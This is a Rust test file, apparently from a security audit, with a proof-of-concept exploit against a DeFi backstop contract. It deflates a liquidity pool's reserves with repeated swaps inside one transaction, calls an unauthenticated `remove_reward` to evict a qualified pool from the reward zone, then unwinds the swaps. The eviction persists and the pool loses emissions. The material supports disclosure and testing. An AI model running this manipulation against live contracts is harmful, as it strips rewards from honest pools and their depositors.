#![cfg(test)]
#![allow(clippy::zero_prefixed_literal)]

use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};

const ACTIVATION_THRESHOLD_USDC: i128 = 12_500 * SCALAR_7;

/// PoC for the non-auction leg of the finding.
///
/// `remove_from_reward_zone` (`backstop/src/emissions/manager.rs:74`) evicts any
/// pool whose `active_value` is under the activation threshold, and `remove_reward`
/// (`backstop/src/contract.rs:384`) has no `require_auth`. `active_value` is a live
/// Comet read, so a single-transaction anchor deflation makes a qualified pool look
/// unqualified for exactly as long as it takes to call the eviction.
///
/// Unlike the auction legs, there is no Dutch curve and no filler to reprice the bad
/// read: `set_reward_zone` commits the new membership list to storage, and it stays
/// committed after the reserves are restored.
#[test]
fn poc_anchor_deflation_evicts_a_reward_zone_pool() {
    let fixture = create_fixture_with_data(false);
    let victim = fixture.pools[0].pool.address.clone();
    let blnt = &fixture.tokens[TokenIndex::BLNT];
    let usdc = &fixture.tokens[TokenIndex::USDC];
    let attacker = fixture.users[0].clone();

    // --- baseline -----------------------------------------------------
    assert!(
        fixture.backstop.reward_zone().contains(&victim),
        "victim starts in the reward zone"
    );
    let honest_value = fixture.backstop.pool_data(&victim).active_value;
    std::println!("honest active_value = {} (7dp USD)", honest_value);
    assert!(honest_value >= ACTIVATION_THRESHOLD_USDC);

    // Honestly, the pool cannot be evicted: it meets the threshold.
    assert!(
        fixture.backstop.try_remove_reward(&victim).is_err(),
        "a qualified pool is not evictable at honest reserves"
    );

    // A week of emissions while the victim is a member, for comparison.
    fixture.jump(60 * 60 * 24 * 7);
    fixture.backstop.distribute();
    let emissions_while_in = fixture.pools[0].pool.gulp_emissions();
    std::println!("emissions for one week in zone = {}", emissions_while_in);
    assert!(emissions_while_in > 0);

    // --- single transaction begins ------------------------------------
    // `require_distribute_run_recently` needs a checkpoint newer than
    // CHECKPOINT_MAX_AGE_SECONDS. It is a freshness check, not an authorization
    // check: the checkpoint is fresh from the `distribute()` above, and an
    // attacker facing a stale one just calls `distribute()` themselves first.
    blnt.mint(&attacker, &(2_000_000_000 * SCALAR_7));
    let blnt_before = blnt.balance(&attacker);
    let usdc_before = usdc.balance(&attacker);

    let mut swaps = 0;
    while fixture.backstop.pool_data(&victim).active_value >= ACTIVATION_THRESHOLD_USDC {
        let reserve = fixture.lp.get_balance(&blnt.address);
        fixture.lp.swap_exact_amount_in(
            &blnt.address,
            &(reserve / 4),
            &usdc.address,
            &0,
            &i128::MAX,
            &attacker,
        );
        swaps += 1;
        assert!(swaps <= 8, "could not cross the threshold within 8 swaps");
    }
    let skewed_value = fixture.backstop.pool_data(&victim).active_value;
    std::println!(
        "after {} BLNT-in swaps: active_value = {} ({}% of honest, threshold {})",
        swaps,
        skewed_value,
        skewed_value * 100 / honest_value,
        ACTIVATION_THRESHOLD_USDC
    );

    // Permissionless eviction on the manipulated read.
    fixture.backstop.remove_reward(&victim);
    assert!(!fixture.backstop.reward_zone().contains(&victim));

    // Unwind: give back every USDC the skew bought.
    let mut usdc_left = usdc.balance(&attacker) - usdc_before;
    while usdc_left > 0 {
        let reserve = fixture.lp.get_balance(&usdc.address);
        let amt = core::cmp::min(usdc_left, reserve / 4);
        if amt == 0 {
            break;
        }
        fixture.lp.swap_exact_amount_in(
            &usdc.address,
            &amt,
            &blnt.address,
            &0,
            &i128::MAX,
            &attacker,
        );
        usdc_left -= amt;
    }
    // --- single transaction ends --------------------------------------

    let blnt_cost = blnt_before - blnt.balance(&attacker);
    let cost_usd = blnt_cost * fixture.backstop.blnt_price() / SCALAR_7;
    std::println!(
        "round-trip cost = {} BLNT (~{} 7dp USD)",
        blnt_cost / SCALAR_7,
        cost_usd
    );

    // --- the damage ---------------------------------------------------
    let restored_value = fixture.backstop.pool_data(&victim).active_value;
    std::println!("restored active_value = {} (7dp USD)", restored_value);

    // The victim is qualified again on the merits...
    assert!(
        restored_value >= ACTIVATION_THRESHOLD_USDC,
        "victim is honestly qualified once reserves are restored"
    );
    // ...and still evicted, because the membership list was committed.
    assert!(
        !fixture.backstop.reward_zone().contains(&victim),
        "eviction persists after the anchor is restored"
    );

    // It costs the victim real emissions for as long as it stands.
    fixture.jump(60 * 60 * 24 * 7);
    // This fixture's reward zone had exactly one member, so the eviction empties
    // it and `distribute` now fails outright with NoEligibleWeight. On a populated
    // zone the same eviction is not fatal to distribution -- it redirects the
    // victim's share to the remaining members. Either way the victim earns zero.
    assert!(
        fixture.backstop.try_distribute().is_err(),
        "an emptied reward zone has no eligible weight left to distribute to"
    );
    // Nothing reached the pool, so there is nothing to gulp: the call reverts
    // with BadRequest rather than paying out a week of emissions.
    let gulped = fixture.pools[0].pool.try_gulp_emissions();
    std::println!(
        "gulp after a week out of zone: ok={} (earned {} for the week in zone)",
        gulped.is_ok(),
        emissions_while_in
    );
    assert!(
        gulped.is_err() || gulped.unwrap().unwrap() == 0,
        "an evicted pool earns nothing while it is out"
    );

    // Honest bound: re-entry is only expensive when the zone is full. Here the
    // eviction freed a slot, so the victim can walk back in with one call. The
    // durable version of this attack needs a full reward zone, where re-entry
    // requires out-weighing an incumbent.
    let reentry = fixture.backstop.try_add_reward(&victim, &None);
    std::println!("victim can re-add with a free slot = {}", reentry.is_ok());
}
